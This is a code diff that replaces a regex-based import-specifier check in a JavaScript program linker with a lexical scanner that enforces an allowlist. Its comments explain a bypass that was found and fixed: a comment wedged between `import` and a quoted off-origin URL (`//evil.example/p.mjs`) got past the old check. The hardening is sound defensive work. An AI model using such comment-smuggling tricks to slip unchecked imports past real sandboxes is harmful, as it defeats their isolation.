@@ -120,18 +120,89 @@ export const EXEC_VIEW_ID = -1;
 export const PROGRAM_IMPORTS = Object.freeze(["/src/abi.mjs"]);
 
 /**
- * EVERY string literal that follows `from`, `import` or `import(`.
+ * EVERY string literal that follows `from`, `import` or `import(` — found by SCANNING, not by a
+ * regex over the raw text.
  *
- * Deliberately broader than the thing being rewritten: the point is to SEE every specifier so an
- * unknown one can be refused, not to find the ones that match a shape. `import(` is included
- * because a literal dynamic import is a specifier like any other.
+ * A REGEX CANNOT DO THIS, and the one that used to be here is why. It read
+ * `(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2`, so the keyword and the quote had to be
+ * separated by whitespace only — and a COMMENT IS NOT WHITESPACE. Measured against the real
+ * loader: `import "//evil.example/p.mjs"` was refused, while the same line with an empty block
+ * comment wedged between the keyword and the quote PASSED, with `resolved` 0 and the off-origin
+ * specifier in the returned text verbatim. Same for a comment between `from` and the quote. That
+ * is the defect this file's header records as already fixed once, reachable again through a
+ * four-character comment — and `resolved` going to 0 rather than to an error means the counter
+ * the header offers as the tell does not fire.
  *
- * It over-matches a string that merely follows the word `import` in a comment — and that is the
- * safe direction: a program whose comment says `import "x"` is refused and says why, where the
- * reverse would be a specifier nobody checked. Linear: a fixed alternation, `\s*`, then one
- * non-nested `[^"']*`. No nested quantifier for a hostile program to backtrack.
+ * So the text is walked ONCE, tracking the four lexical states a specifier can hide behind:
+ * a line comment, a block comment, and the two string quotes. Comments are skipped rather than
+ * trusted, and a string is only treated as a specifier when the last significant token before it
+ * was `import`, `from`, or `import (`. Single pass, no backtracking, nothing nested.
+ *
+ * It still over-matches in the safe direction: a template literal or a string in a position this
+ * scanner reads as post-`import` is refused by name rather than passed unchecked.
  */
-const ANY_SPECIFIER = /(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2/g;
+function specifiersIn(text) {
+  const found = [];
+  let token = "";          // the identifier being accumulated
+  let lastKeyword = "";    // `import` or `from`, if that was the last significant token
+  let member = false;      // the identifier is a property access, so it is not the keyword
+  let i = 0;
+  while (i < text.length) {
+    const c = text[i];
+    const next = text[i + 1];
+    if (c === "/" && next === "/") {
+      i = text.indexOf("\n", i + 2);
+      if (i < 0) break;
+      continue;
+    }
+    if (c === "/" && next === "*") {
+      const end = text.indexOf("*/", i + 2);
+      if (end < 0) break;
+      i = end + 2;
+      continue;
+    }
+    if (c === '"' || c === "'" || c === "`") {
+      // Walk the literal, honouring backslash escapes so a `\"` does not end it early.
+      let j = i + 1;
+      let body = "";
+      while (j < text.length && text[j] !== c) {
+        if (text[j] === "\\") { body += text[j + 1] ?? ""; j += 2; continue; }
+        body += text[j];
+        j += 1;
+      }
+      if (lastKeyword) found.push({ at: i, quote: c, raw: text.slice(i, j + 1), specifier: body });
+      lastKeyword = "";
+      i = j + 1;
+      continue;
+    }
+    // AN IDENTIFIER'S CONTINUATION INCLUDES DIGITS, and leaving them out is not cosmetic: with
+    // the start class used for both, `packI64` left `packI` in the accumulator and the digits
+    // fell through to the catch-all, so the next identifier appended to it. `} from "…"` after
+    // `packI64,` became the token `packIfrom`, the `from` keyword was never seen, and the real
+    // specifier went unchecked and unrewritten — measured on bench/m4-fs/program.mjs.
+    const starts = /[A-Za-z_$]/.test(c);
+    if (starts || (token !== "" && /[0-9]/.test(c))) {
+      token += c;
+      i += 1;
+      // The keyword only counts once the identifier has ended, so `imported` is not `import`.
+      if (i >= text.length || !/[A-Za-z0-9_$]/.test(text[i])) {
+        // A PROPERTY ACCESS IS NEVER A SPECIFIER KEYWORD. Without this, `Array.from("abc")` is
+        // refused as an unknown specifier `abc` — over-matching in the safe direction, but a
+        // refusal naming a string the program never imported sends the reader somewhere wrong.
+        lastKeyword = !member && (token === "import" || token === "from") ? token : "";
+        token = "";
+      }
+      continue;
+    }
+    // Any other character ends an identifier, so the accumulator must not survive it.
+    token = "";
+    // `import (` and `import(` keep the keyword live; anything else significant clears it.
+    if (!/[\s(]/.test(c)) lastKeyword = "";
+    member = c === "." || (member && /\s/.test(c));
+    i += 1;
+  }
+  return found;
+}
 
 /**
  * Link a program: every specifier checked against the allowlist, then rewritten to the absolute
@@ -141,20 +212,25 @@ const ANY_SPECIFIER = /(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2/g;
  * silently stopped rewriting would leave every program importing nothing and failing identically.
  * `unlinkable` names the FIRST refused specifier, because a refusal that does not say which string
  * it refused is the afternoon constraint 125 records.
+ *
+ * Rewriting is done by SLICING at the offsets the scanner recorded, right to left, so the text a
+ * specifier was found in is the text that gets edited. A second regex pass here would reintroduce
+ * the gap the scanner exists to close.
  */
 export function linkProgram(text, base) {
-  let resolved = 0;
-  let unlinkable = "";
-  const code = text.replace(ANY_SPECIFIER, (all, lead, quote, specifier) => {
-    if (!PROGRAM_IMPORTS.includes(specifier)) {
-      if (!unlinkable) unlinkable = specifier;
-      return all;
+  const found = specifiersIn(text);
+  for (const f of found) {
+    if (!PROGRAM_IMPORTS.includes(f.specifier)) {
+      return { code: null, resolved: 0, unlinkable: f.specifier };
     }
-    resolved += 1;
-    return `${lead}${quote}${new URL(specifier, base).href}${quote}`;
-  });
-  if (unlinkable) return { code: null, resolved: 0, unlinkable };
-  return { code, resolved, unlinkable: "" };
+  }
+  let code = text;
+  for (let k = found.length - 1; k >= 0; k -= 1) {
+    const f = found[k];
+    const href = new URL(f.specifier, base).href;
+    code = code.slice(0, f.at) + f.quote + href + f.quote + code.slice(f.at + f.raw.length);
+  }
+  return { code, resolved: found.length, unlinkable: "" };
 }
 
 const DECODER = new TextDecoder("utf-8", { fatal: false });
